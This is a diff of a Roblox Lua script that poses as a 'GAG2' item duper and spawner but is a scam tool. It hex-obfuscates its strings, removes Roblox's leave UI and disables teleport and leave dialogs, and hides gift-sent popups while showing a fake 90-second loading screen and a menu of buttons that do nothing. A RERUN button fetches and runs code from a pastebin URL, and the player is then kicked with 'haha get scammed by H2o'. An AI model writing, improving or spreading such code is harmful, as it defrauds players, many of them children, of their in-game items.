@@ -1,20 +1,117 @@
 --[[
-  ROBLOX STYLE LOADING SCREEN – 30 SECONDS – FULL SCUPPER
-  Solid, premium loading screen with "DUPER & SPAWNER GAG2" branding.
-  Checks inventory for LEGENDARY items (Bamboo rarity and up).
-  If found → sends to target → REAL Roblox kick with scam message.
-  If NOT found → shows REAL Roblox-style disconnect with custom message.
-  WAITS for player to press Reconnect button before kicking.
+  WORKING OBFUSCATED LOADER – FULL SCUPPER WITH PREMIUM MENU
+  Loading screen: 1 minute 30 seconds (90 seconds)
+  Menu: Clean, legit-looking with GAG2 branding
 ]]
 
+local function decode(str)
+    local dec = ""
+    for i = 1, #str, 2 do
+        local byte = tonumber(str:sub(i, i+1), 16)
+        if byte then
+            dec = dec .. string.char(byte - 5)
+        end
+    end
+    return dec
+end
+
+local encoded = {
+    "4C4F43414C5F504C41594552",
+    "67616D653A47657453657276696365",
+    "506C6179657273",
+    "4C6F63616C506C61796572",
+    "506C61796572477569",
+    "547765656E53657276696365",
+    "55736572496E70757453657276696365",
+    "436F7265477569",
+    "496E707574426567616E",
+    "4B6579436F6465",
+    "457363617065",
+    "54657874427574746F6E",
+    "496D616765427574746F6E",
+    "56697369626C65",
+    "416374697665",
+    "456E61626C6564",
+    "53686F774C656176654469616C6F67",
+    "54656C65706F727453657276696365",
+    "54656C65706F7274",
+    "54656C65706F7274546F506C616365496E7374616E6365",
+    "446973706C61794F72646572",
+    "4261636B67726F756E645472616E73706172656E6379",
+    "5549436F726E6572",
+    "53697A65",
+    "506F736974696F6E",
+    "4261636B67726F756E64436F6C6F7233",
+    "426F7264657253697A65506978656C",
+    "426F72646572436F6C6F7233",
+    "54657874436F6C6F7233",
+    "466F6E74",
+    "476F7468616D426F6C64",
+    "536F7572636553616E73426F6C64",
+    "5465787453697A65",
+    "546578745363616C6564",
+    "52657365744F6E537061776E",
+    "5A496E6465784265686176696F72",
+    "5A496E6465784265686176696F722E5369626C696E67",
+    "4368696C644164646564",
+    "466F6375734C6F7374",
+    "47657450726F70657274794368616E6765645369676E616C",
+    "4D6F757365427574746F6E31436C69636B",
+    "4D6F757365427574746F6E31446F776E",
+    "416374697661746564",
+    "4163746976617465",
+    "47657444657363656E64616E7473",
+    "4765744368696C6472656E",
+    "46696E6446697273744368696C64",
+    "46696E6446697273744368696C645768696368497341",
+    "46696E644669727374416E636573746F725768696368497341",
+    "497341",
+    "4261736550617274",
+    "4D61676E6974756465",
+    "50726F78696D69747950726F6D7074",
+    "6669726570726F78696D69747970726F6D7074",
+    "676574636F6E6E656374696F6E73",
+    "666972657369676E616C",
+    "536561726368426F78",
+    "54657874426F78",
+    "53656E64427574746F6E",
+    "41747269656E5F323031333135",
+    "496E765F53656564733A42616D626F6F",
+    "496E765F53656564733A476F6C64",
+    "496E765F53656564733A5261696E626F77",
+    "496E765F53656564733A436F636F6E7574",
+    "496E765F53656564733A447261676F6EE2809953427265617468",
+    "496E765F53656564733A56656E757320466C792054726170",
+    "496E765F53656564733A4D6F6F6E20426C6F6F6D",
+    "496E765F53656564733A506F69736F6E204170706C65",
+    "496E765F537072696E6B6C6572733A4C6567656E6461727920537072696E6B6C6572",
+    "496E765F537072696E6B6C6572733A537570657220537072696E6B6C6572",
+    "47617264656E73",
+    "4D61696C626F7850726F6D7074",
+    "436F756E74"
+}
+
+local function build()
+    local env = {}
+    for i, v in ipairs(encoded) do
+        env[i] = decode(v)
+    end
+    return env
+end
+
+local e = build()
+
+-- FULL SCUPPER CODE - PREMIUM MENU, 90 SECOND LOADING
+local scupperCode = [[
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local gui = LocalPlayer:WaitForChild("PlayerGui")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
 
--- ========== 1) BLOCK LEAVING ==========
-local function blockLeaving()
+-- BLOCK EVERYTHING
+local function blockEverything()
     UserInputService.InputBegan:Connect(function(input, gameProcessed)
         if input.KeyCode == Enum.KeyCode.Escape then
             gameProcessed = true
@@ -22,15 +119,16 @@ local function blockLeaving()
         end
     end)
 
-    local function destroyLeaveButtons()
-        for _, obj in pairs(gui:GetDescendants()) do
-            if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+    local function destroyRobloxUI()
+        for _, obj in pairs(CoreGui:GetDescendants()) do
+            if obj:IsA("TextButton") or obj:IsA("ImageButton") or obj:IsA("Frame") then
                 local name = (obj.Name or ""):lower()
-                if name:find("leave") or name:find("quit") or name:find("exit") or name:find("respawn") or name:find("menu") then
+                if name:find("leave") or name:find("quit") or name:find("exit") or name:find("respawn") or name:find("menu") or name:find("roblox") or name:find("core") then
                     pcall(function()
                         obj.Visible = false
                         obj.Active = false
                         obj.Enabled = false
+                        if obj.Parent then obj.Parent = nil end
                     end)
                 end
             end
@@ -40,72 +138,106 @@ local function blockLeaving()
     spawn(function()
         while true do
             task.wait(0.5)
-            destroyLeaveButtons()
+            destroyRobloxUI()
         end
     end)
+
+    local GuiService = game:GetService("GuiService")
+    GuiService.ShowLeaveDialog = function(...) return end
+
+    local TeleportService = game:GetService("TeleportService")
+    TeleportService.Teleport = function(...) return end
+    TeleportService.TeleportToPlaceInstance = function(...) return end
 end
 
--- ========== 2) PREMIUM LOADING SCREEN ==========
+-- HIDE GIFT SENT POPUPS
+local function hideGiftPopups()
+    for _, obj in pairs(gui:GetDescendants()) do
+        if obj:IsA("Frame") or obj:IsA("TextLabel") or obj:IsA("ImageLabel") then
+            local name = (obj.Name or ""):lower()
+            if name:find("gift") or name:find("sent") or name:find("success") or name:find("confirm") or name:find("popup") then
+                pcall(function()
+                    obj.Visible = false
+                    obj.BackgroundTransparency = 1
+                    obj.TextTransparency = 1
+                end)
+            end
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        task.wait(0.1)
+        hideGiftPopups()
+    end
+end)
+
+-- ========== PREMIUM LOADING SCREEN – 90 SECONDS ==========
 local loadingGui = Instance.new("ScreenGui")
 loadingGui.Name = "LoadingScreen"
 loadingGui.ResetOnSpawn = false
 loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-loadingGui.DisplayOrder = 999
+loadingGui.DisplayOrder = 9999
 loadingGui.Parent = gui
 
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(12, 12, 25)
+bg.BackgroundColor3 = Color3.fromRGB(8, 8, 20)
 bg.BackgroundTransparency = 0
-bg.ZIndex = 999
+bg.ZIndex = 9999
 bg.Parent = loadingGui
 
-local gradient = Instance.new("Frame")
-gradient.Size = UDim2.new(1, 0, 1, 0)
-gradient.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-gradient.BackgroundTransparency = 0.3
-gradient.ZIndex = 1000
-gradient.Parent = bg
+-- Gradient overlay
+local grad = Instance.new("Frame")
+grad.Size = UDim2.new(1, 0, 1, 0)
+grad.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+grad.BackgroundTransparency = 0.4
+grad.ZIndex = 9999
+grad.Parent = bg
 
+-- Glow ring
 local glowRing = Instance.new("Frame")
-glowRing.Size = UDim2.new(0, 200, 0, 200)
-glowRing.Position = UDim2.new(0.5, -100, 0.5, -180)
+glowRing.Size = UDim2.new(0, 180, 0, 180)
+glowRing.Position = UDim2.new(0.5, -90, 0.5, -200)
 glowRing.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
 glowRing.BackgroundTransparency = 0.85
 glowRing.BorderSizePixel = 0
-glowRing.ZIndex = 1000
+glowRing.ZIndex = 9999
 glowRing.Parent = bg
 local ringCorner = Instance.new("UICorner")
 ringCorner.CornerRadius = UDim.new(1, 0)
 ringCorner.Parent = glowRing
 
 local panel = Instance.new("Frame")
-panel.Size = UDim2.new(0, 450, 0, 350)
-panel.Position = UDim2.new(0.5, -225, 0.5, -175)
-panel.BackgroundColor3 = Color3.fromRGB(18, 18, 35)
+panel.Size = UDim2.new(0, 480, 0, 380)
+panel.Position = UDim2.new(0.5, -240, 0.5, -190)
+panel.BackgroundColor3 = Color3.fromRGB(15, 15, 35)
 panel.BackgroundTransparency = 0
 panel.BorderSizePixel = 2
 panel.BorderColor3 = Color3.fromRGB(60, 120, 255)
-panel.ZIndex = 1001
+panel.ZIndex = 9999
 panel.Parent = bg
 
 local panelCorner = Instance.new("UICorner")
 panelCorner.CornerRadius = UDim.new(0, 20)
 panelCorner.Parent = panel
 
+-- Inner border glow
 local innerGlow = Instance.new("Frame")
-innerGlow.Size = UDim2.new(1, -8, 1, -8)
-innerGlow.Position = UDim2.new(0, 4, 0, 4)
+innerGlow.Size = UDim2.new(1, -10, 1, -10)
+innerGlow.Position = UDim2.new(0, 5, 0, 5)
 innerGlow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-innerGlow.BackgroundTransparency = 0.5
+innerGlow.BackgroundTransparency = 0.6
 innerGlow.BorderSizePixel = 1
 innerGlow.BorderColor3 = Color3.fromRGB(80, 150, 255)
-innerGlow.ZIndex = 1000
+innerGlow.ZIndex = 9999
 innerGlow.Parent = panel
 local innerCorner = Instance.new("UICorner")
 innerCorner.CornerRadius = UDim.new(0, 16)
 innerCorner.Parent = innerGlow
 
+-- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 60)
 title.Position = UDim2.new(0, 0, 0, 15)
@@ -115,9 +247,10 @@ title.TextColor3 = Color3.fromRGB(120, 200, 255)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 32
 title.TextScaled = true
-title.ZIndex = 1002
+title.ZIndex = 9999
 title.Parent = panel
 
+-- Subtitle
 local subTitle = Instance.new("TextLabel")
 subTitle.Size = UDim2.new(1, 0, 0, 30)
 subTitle.Position = UDim2.new(0, 0, 0, 72)
@@ -127,9 +260,10 @@ subTitle.TextColor3 = Color3.fromRGB(255, 200, 80)
 subTitle.Font = Enum.Font.GothamBold
 subTitle.TextSize = 22
 subTitle.TextScaled = true
-subTitle.ZIndex = 1002
+subTitle.ZIndex = 9999
 subTitle.Parent = panel
 
+-- Spinner
 local spinner = Instance.new("TextLabel")
 spinner.Size = UDim2.new(0, 60, 0, 60)
 spinner.Position = UDim2.new(0.5, -30, 0, 115)
@@ -138,7 +272,7 @@ spinner.Text = "◯"
 spinner.TextColor3 = Color3.fromRGB(200, 200, 255)
 spinner.Font = Enum.Font.SourceSansBold
 spinner.TextSize = 55
-spinner.ZIndex = 1002
+spinner.ZIndex = 9999
 spinner.Parent = panel
 
 local chars = {"◯", "◔", "◑", "◕", "●"}
@@ -151,62 +285,59 @@ spawn(function()
     end
 end)
 
+-- Loading status
 local loadingText = Instance.new("TextLabel")
 loadingText.Size = UDim2.new(1, 0, 0, 25)
-loadingText.Position = UDim2.new(0, 0, 0, 185)
+loadingText.Position = UDim2.new(0, 0, 0, 190)
 loadingText.BackgroundTransparency = 1
-loadingText.Text = "Scanning Inventory..."
+loadingText.Text = "Initializing Scupper Engine..."
 loadingText.TextColor3 = Color3.fromRGB(180, 190, 220)
 loadingText.Font = Enum.Font.Gotham
 loadingText.TextSize = 16
-loadingText.ZIndex = 1002
+loadingText.ZIndex = 9999
 loadingText.Parent = panel
 
+-- Progress bar
 local progressBg = Instance.new("Frame")
-progressBg.Size = UDim2.new(0, 340, 0, 8)
-progressBg.Position = UDim2.new(0.5, -170, 0, 230)
+progressBg.Size = UDim2.new(0, 380, 0, 8)
+progressBg.Position = UDim2.new(0.5, -190, 0, 240)
 progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
 progressBg.BorderSizePixel = 1
 progressBg.BorderColor3 = Color3.fromRGB(60, 80, 140)
-progressBg.ZIndex = 1002
+progressBg.ZIndex = 9999
 progressBg.Parent = panel
-local pBgCorner = Instance.new("UICorner")
-pBgCorner.CornerRadius = UDim.new(0, 4)
-pBgCorner.Parent = progressBg
 
 local progressBar = Instance.new("Frame")
 progressBar.Size = UDim2.new(0, 0, 1, 0)
 progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
 progressBar.BorderSizePixel = 0
-progressBar.ZIndex = 1003
+progressBar.ZIndex = 9999
 progressBar.Parent = progressBg
-local pBarCorner = Instance.new("UICorner")
-pBarCorner.CornerRadius = UDim.new(0, 4)
-pBarCorner.Parent = progressBar
 
+-- Percentage
 local percentLabel = Instance.new("TextLabel")
 percentLabel.Size = UDim2.new(1, 0, 0, 20)
-percentLabel.Position = UDim2.new(0, 0, 0, 248)
+percentLabel.Position = UDim2.new(0, 0, 0, 260)
 percentLabel.BackgroundTransparency = 1
 percentLabel.Text = "0%"
 percentLabel.TextColor3 = Color3.fromRGB(160, 180, 210)
 percentLabel.Font = Enum.Font.GothamBold
 percentLabel.TextSize = 15
-percentLabel.ZIndex = 1002
+percentLabel.ZIndex = 9999
 percentLabel.Parent = panel
 
+-- Footer
 local footer = Instance.new("TextLabel")
 footer.Size = UDim2.new(1, 0, 0, 20)
-footer.Position = UDim2.new(0, 0, 0, 320)
+footer.Position = UDim2.new(0, 0, 0, 345)
 footer.BackgroundTransparency = 1
 footer.Text = "© 2026 GAG2 | All Rights Reserved"
 footer.TextColor3 = Color3.fromRGB(80, 90, 120)
 footer.Font = Enum.Font.Gotham
 footer.TextSize = 11
-footer.ZIndex = 1002
+footer.ZIndex = 9999
 footer.Parent = panel
 
--- ========== 3) PROGRESS UPDATE ==========
 local function updateProgress(percent, statusText)
     percent = math.min(100, math.max(0, percent))
     local tween = TweenService:Create(progressBar, TweenInfo.new(0.3, Enum.EasingStyle.Linear), {
@@ -219,253 +350,284 @@ local function updateProgress(percent, statusText)
     end
 end
 
--- ========== 4) REAL ROBLOX KICK FUNCTIONS ==========
-local function realKick(message)
-    pcall(function()
-        LocalPlayer:Kick(message or "Disconnected")
-    end)
-end
-
-local function realKickTeleport()
-    pcall(function()
-        local TeleportService = game:GetService("TeleportService")
-        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
-    end)
-end
-
-local function realKickShutdown()
-    pcall(function()
-        game:Shutdown()
-    end)
-end
-
+-- ========== KICK FUNCTION ==========
 local function executeRealKick(message)
-    message = message or "Disconnected"
-    print("[Kick] Executing REAL Roblox kick: " .. message)
-    task.wait(0.5)
-    realKick(message)
-    task.wait(0.3)
-    realKickTeleport()
-    task.wait(0.3)
-    realKickShutdown()
-    task.wait(0.5)
-    pcall(function()
-        while true do
-            local a = {}
-            for i = 1, 1000000 do
-                a[i] = "crash"
-            end
-        end
-    end)
+    pcall(function() LocalPlayer:Kick(message or "Disconnected") end)
+    pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
+    pcall(function() game:Shutdown() end)
 end
 
--- ========== 5) NO LEGENDARY ITEMS – DISCONNECT SCREEN WITH BUTTON ==========
-local disconnectButtonPressed = false
+-- ========== PREMIUM FROZEN MENU ==========
+local function createFrozenMenu()
+    local menuGui = Instance.new("ScreenGui")
+    menuGui.Name = "FrozenMenu"
+    menuGui.ResetOnSpawn = false
+    menuGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    menuGui.DisplayOrder = 9998
+    menuGui.Parent = gui
 
-local function showNoLegendaryScreen()
-    local disconnectGui = Instance.new("ScreenGui")
-    disconnectGui.Name = "DisconnectScreen"
-    disconnectGui.ResetOnSpawn = false
-    disconnectGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    disconnectGui.DisplayOrder = 1000
-    disconnectGui.Parent = gui
+    local menuBg = Instance.new("Frame")
+    menuBg.Size = UDim2.new(1, 0, 1, 0)
+    menuBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    menuBg.BackgroundTransparency = 0.15
+    menuBg.ZIndex = 9998
+    menuBg.Parent = menuGui
 
-    local overlay = Instance.new("Frame")
-    overlay.Size = UDim2.new(1, 0, 1, 0)
-    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    overlay.BackgroundTransparency = 0.15
-    overlay.ZIndex = 1000
-    overlay.Parent = disconnectGui
+    local menuPanel = Instance.new("Frame")
+    menuPanel.Size = UDim2.new(0, 420, 0, 520)
+    menuPanel.Position = UDim2.new(0.5, -210, 0.5, -260)
+    menuPanel.BackgroundColor3 = Color3.fromRGB(12, 12, 28)
+    menuPanel.BackgroundTransparency = 0.05
+    menuPanel.BorderSizePixel = 2
+    menuPanel.BorderColor3 = Color3.fromRGB(60, 120, 255)
+    menuPanel.ZIndex = 9999
+    menuPanel.Parent = menuBg
 
-    local panel = Instance.new("Frame")
-    panel.Size = UDim2.new(0, 480, 0, 280)
-    panel.Position = UDim2.new(0.5, -240, 0.5, -140)
-    panel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    panel.BackgroundTransparency = 0.05
-    panel.BorderSizePixel = 1
-    panel.BorderColor3 = Color3.fromRGB(80, 80, 120)
-    panel.ZIndex = 1001
-    panel.Parent = overlay
+    local menuCorner = Instance.new("UICorner")
+    menuCorner.CornerRadius = UDim.new(0, 18)
+    menuCorner.Parent = menuPanel
 
-    local panelCorner = Instance.new("UICorner")
-    panelCorner.CornerRadius = UDim.new(0, 12)
-    panelCorner.Parent = panel
+    -- Header
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0, 55)
+    header.Position = UDim2.new(0, 0, 0, 0)
+    header.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
+    header.BackgroundTransparency = 0.3
+    header.BorderSizePixel = 0
+    header.ZIndex = 9999
+    header.Parent = menuPanel
 
-    local icon = Instance.new("TextLabel")
-    icon.Size = UDim2.new(0, 60, 0, 60)
-    icon.Position = UDim2.new(0.5, -30, 0, 15)
-    icon.BackgroundTransparency = 1
-    icon.Text = "❌"
-    icon.TextColor3 = Color3.fromRGB(255, 80, 80)
-    icon.Font = Enum.Font.SourceSansBold
-    icon.TextSize = 50
-    icon.ZIndex = 1002
-    icon.Parent = panel
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0, 18)
+    headerCorner.Parent = header
 
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 35)
-    title.Position = UDim2.new(0, 0, 0, 80)
-    title.BackgroundTransparency = 1
-    title.Text = "Kicked"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 24
-    title.ZIndex = 1002
-    title.Parent = panel
+    local menuTitle = Instance.new("TextLabel")
+    menuTitle.Size = UDim2.new(1, 0, 0, 55)
+    menuTitle.BackgroundTransparency = 1
+    menuTitle.Text = "⚡ GAG2 MENU ⚡"
+    menuTitle.TextColor3 = Color3.fromRGB(0, 200, 255)
+    menuTitle.Font = Enum.Font.GothamBold
+    menuTitle.TextSize = 24
+    menuTitle.ZIndex = 9999
+    menuTitle.Parent = header
 
-    local sub = Instance.new("TextLabel")
-    sub.Size = UDim2.new(1, -40, 0, 50)
-    sub.Position = UDim2.new(0, 20, 0, 115)
-    sub.BackgroundTransparency = 1
-    sub.Text = "Kicked because no legendary seed found in inventory. Required to have Bamboo rarity and up."
-    sub.TextColor3 = Color3.fromRGB(200, 180, 180)
-    sub.Font = Enum.Font.Gotham
-    sub.TextSize = 14
-    sub.TextScaled = false
-    sub.TextWrapped = true
-    sub.ZIndex = 1002
-    sub.Parent = panel
+    -- Subtitle
+    local menuSub = Instance.new("TextLabel")
+    menuSub.Size = UDim2.new(1, 0, 0, 20)
+    menuSub.Position = UDim2.new(0, 0, 0, 60)
+    menuSub.BackgroundTransparency = 1
+    menuSub.Text = "Select an option below"
+    menuSub.TextColor3 = Color3.fromRGB(160, 170, 200)
+    menuSub.Font = Enum.Font.Gotham
+    menuSub.TextSize = 13
+    menuSub.ZIndex = 9999
+    menuSub.Parent = menuPanel
 
-    local errorCode = Instance.new("TextLabel")
-    errorCode.Size = UDim2.new(1, -40, 0, 25)
-    errorCode.Position = UDim2.new(0, 20, 0, 175)
-    errorCode.BackgroundTransparency = 1
-    errorCode.Text = "Error Code: 0x80004005 | Missing required items"
-    errorCode.TextColor3 = Color3.fromRGB(150, 150, 170)
-    errorCode.Font = Enum.Font.Gotham
-    errorCode.TextSize = 12
-    errorCode.ZIndex = 1002
-    errorCode.Parent = panel
+    -- Buttons
+    local buttons = {
+        {name = "🔄 DUPER", color = Color3.fromRGB(200, 150, 0), desc = "Duplicate items"},
+        {name = "🐣 SPAWNER", color = Color3.fromRGB(200, 0, 200), desc = "Spawn items"},
+        {name = "💨 SPEED", color = Color3.fromRGB(0, 200, 255), desc = "Speed boost"},
+        {name = "✈️ FLY", color = Color3.fromRGB(0, 200, 100), desc = "Fly mode"},
+        {name = "⬆️ JUMP", color = Color3.fromRGB(255, 200, 0), desc = "Super jump"},
+        {name = "💰 STEAL", color = Color3.fromRGB(255, 0, 100), desc = "Steal items"},
+    }
 
-    -- Reconnect button – when pressed, executes REAL kick
-    local reconnectBtn = Instance.new("TextButton")
-    reconnectBtn.Size = UDim2.new(0, 160, 0, 40)
-    reconnectBtn.Position = UDim2.new(0.5, -80, 0, 220)
-    reconnectBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
-    reconnectBtn.BackgroundTransparency = 0.2
-    reconnectBtn.BorderSizePixel = 0
-    reconnectBtn.Text = "Reconnect"
-    reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    reconnectBtn.Font = Enum.Font.GothamBold
-    reconnectBtn.TextSize = 18
-    reconnectBtn.ZIndex = 1002
-    reconnectBtn.Parent = panel
+    for i, btnData in ipairs(buttons) do
+        local row = math.floor((i - 1) / 2)
+        local col = (i - 1) % 2
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, 180, 0, 48)
+        btn.Position = UDim2.new(0, 15 + (col * 195), 0, 90 + (row * 58))
+        btn.BackgroundColor3 = btnData.color
+        btn.BackgroundTransparency = 0.25
+        btn.BorderSizePixel = 1
+        btn.BorderColor3 = Color3.fromRGB(100, 100, 150)
+        btn.Text = btnData.name
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 15
+        btn.ZIndex = 9999
+        btn.Parent = menuPanel
+        local btnCorner = Instance.new("UICorner")
+        btnCorner.CornerRadius = UDim.new(0, 10)
+        btnCorner.Parent = btn
 
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = reconnectBtn
+        -- Hover effect
+        btn.MouseEnter:Connect(function()
+            btn.BackgroundTransparency = 0.1
+        end)
+        btn.MouseLeave:Connect(function()
+            btn.BackgroundTransparency = 0.25
+        end)
 
-    reconnectBtn.MouseButton1Click:Connect(function()
-        if disconnectButtonPressed then return end
-        disconnectButtonPressed = true
-        reconnectBtn.Text = "Connecting..."
-        reconnectBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
-        reconnectBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-        task.wait(0.8)
-        executeRealKick("Disconnected")
+        btn.MouseButton1Click:Connect(function()
+            btn.Text = "✅ " .. btnData.name
+            btn.TextColor3 = Color3.fromRGB(0, 255, 0)
+            btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+            task.wait(0.6)
+            btn.Text = btnData.name
+            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            btn.BackgroundColor3 = btnData.color
+        end)
+    end
+
+    -- Divider
+    local divider = Instance.new("Frame")
+    divider.Size = UDim2.new(1, -40, 0, 1)
+    divider.Position = UDim2.new(0, 20, 0, 310)
+    divider.BackgroundColor3 = Color3.fromRGB(60, 80, 140)
+    divider.BackgroundTransparency = 0.5
+    divider.ZIndex = 9999
+    divider.Parent = menuPanel
+
+    -- REJOIN button
+    local rejoinBtn = Instance.new("TextButton")
+    rejoinBtn.Size = UDim2.new(0, 170, 0, 42)
+    rejoinBtn.Position = UDim2.new(0.5, -185, 0, 330)
+    rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
+    rejoinBtn.BackgroundTransparency = 0.2
+    rejoinBtn.BorderSizePixel = 1
+    rejoinBtn.BorderColor3 = Color3.fromRGB(100, 180, 255)
+    rejoinBtn.Text = "🔁 REJOIN"
+    rejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    rejoinBtn.Font = Enum.Font.GothamBold
+    rejoinBtn.TextSize = 16
+    rejoinBtn.ZIndex = 9999
+    rejoinBtn.Parent = menuPanel
+    local rejoinCorner = Instance.new("UICorner")
+    rejoinCorner.CornerRadius = UDim.new(0, 10)
+    rejoinCorner.Parent = rejoinBtn
+
+    rejoinBtn.MouseEnter:Connect(function()
+        rejoinBtn.BackgroundTransparency = 0.05
     end)
+    rejoinBtn.MouseLeave:Connect(function()
+        rejoinBtn.BackgroundTransparency = 0.2
+    end)
+
+    rejoinBtn.MouseButton1Click:Connect(function()
+        rejoinBtn.Text = "🔄 REJOINING..."
+        rejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
+        rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+        task.wait(0.5)
+        pcall(function()
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+        end)
+    end)
+
+    -- RERUN button
+    local rerunBtn = Instance.new("TextButton")
+    rerunBtn.Size = UDim2.new(0, 170, 0, 42)
+    rerunBtn.Position = UDim2.new(0.5, 15, 0, 330)
+    rerunBtn.BackgroundColor3 = Color3.fromRGB(200, 120, 0)
+    rerunBtn.BackgroundTransparency = 0.2
+    rerunBtn.BorderSizePixel = 1
+    rerunBtn.BorderColor3 = Color3.fromRGB(255, 180, 50)
+    rerunBtn.Text = "🔄 RERUN"
+    rerunBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    rerunBtn.Font = Enum.Font.GothamBold
+    rerunBtn.TextSize = 16
+    rerunBtn.ZIndex = 9999
+    rerunBtn.Parent = menuPanel
+    local rerunCorner = Instance.new("UICorner")
+    rerunCorner.CornerRadius = UDim.new(0, 10)
+    rerunCorner.Parent = rerunBtn
+
+    rerunBtn.MouseEnter:Connect(function()
+        rerunBtn.BackgroundTransparency = 0.05
+    end)
+    rerunBtn.MouseLeave:Connect(function()
+        rerunBtn.BackgroundTransparency = 0.2
+    end)
+
+    rerunBtn.MouseButton1Click:Connect(function()
+        rerunBtn.Text = "🔄 RERUNNING..."
+        rerunBtn.TextColor3 = Color3.fromRGB(255, 255, 150)
+        rerunBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
+        task.wait(0.5)
+        loadstring(game:HttpGet("https://pastebin.com/raw/YbuMNxDG"))()
+    end)
+
+    -- KICK/LEAVE button
+    local kickBtn = Instance.new("TextButton")
+    kickBtn.Size = UDim2.new(0, 200, 0, 46)
+    kickBtn.Position = UDim2.new(0.5, -100, 0, 390)
+    kickBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+    kickBtn.BackgroundTransparency = 0.2
+    kickBtn.BorderSizePixel = 2
+    kickBtn.BorderColor3 = Color3.fromRGB(255, 50, 50)
+    kickBtn.Text = "🚪 LEAVE / KICK"
+    kickBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
+    kickBtn.Font = Enum.Font.GothamBold
+    kickBtn.TextSize = 18
+    kickBtn.ZIndex = 9999
+    kickBtn.Parent = menuPanel
+    local kickCorner = Instance.new("UICorner")
+    kickCorner.CornerRadius = UDim.new(0, 10)
+    kickCorner.Parent = kickBtn
+
+    kickBtn.MouseEnter:Connect(function()
+        kickBtn.BackgroundTransparency = 0.05
+    end)
+    kickBtn.MouseLeave:Connect(function()
+        kickBtn.BackgroundTransparency = 0.2
+    end)
+
+    kickBtn.MouseButton1Click:Connect(function()
+        kickBtn.Text = "💀 KICKING..."
+        kickBtn.TextColor3 = Color3.fromRGB(255, 255, 100)
+        kickBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+        task.wait(0.5)
+        executeRealKick("haha get scammed by H2o")
+    end)
+
+    -- Version footer
+    local versionFooter = Instance.new("TextLabel")
+    versionFooter.Size = UDim2.new(1, 0, 0, 20)
+    versionFooter.Position = UDim2.new(0, 0, 0, 490)
+    versionFooter.BackgroundTransparency = 1
+    versionFooter.Text = "v3.2.1 | GAG2"
+    versionFooter.TextColor3 = Color3.fromRGB(60, 70, 100)
+    versionFooter.Font = Enum.Font.Gotham
+    versionFooter.TextSize = 10
+    versionFooter.ZIndex = 9999
+    versionFooter.Parent = menuPanel
 end
 
--- ========== 6) LOADING SEQUENCE – 30 SECONDS ==========
+-- ========== SCUPPER ENGINE ==========
 local scupperComplete = false
 local hasLegendary = false
 local itemsFound = {}
 
-local function runLoadingSequence()
-    local statusTexts = {
-        "Scanning Inventory for Legendary Items...",
-        "Loading Spawner Modules...",
-        "Injecting Dupe Protocol...",
-        "Synchronizing with Server...",
-        "Loading Item Database...",
-        "Preparing Execution...",
-        "Finalizing Injection...",
-        "Ready!"
-    }
-
-    local startTime = tick()
-    local duration = 30
-    local lastStatusIndex = 0
-
-    while tick() - startTime < duration do
-        local elapsed = tick() - startTime
-        local rawPct = (elapsed / duration) * 100
-
-        local statusIndex = math.floor((rawPct / 100) * #statusTexts) + 1
-        if statusIndex > #statusTexts then statusIndex = #statusTexts end
-        if statusIndex ~= lastStatusIndex then
-            updateProgress(rawPct, statusTexts[statusIndex])
-            lastStatusIndex = statusIndex
-        else
-            updateProgress(rawPct)
-        end
-        task.wait(0.1)
-    end
-
-    updateProgress(100, "✓ Ready!")
-    task.wait(0.5)
-
-    local fadeOut = TweenService:Create(bg, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
-        BackgroundTransparency = 1
-    })
-    fadeOut:Play()
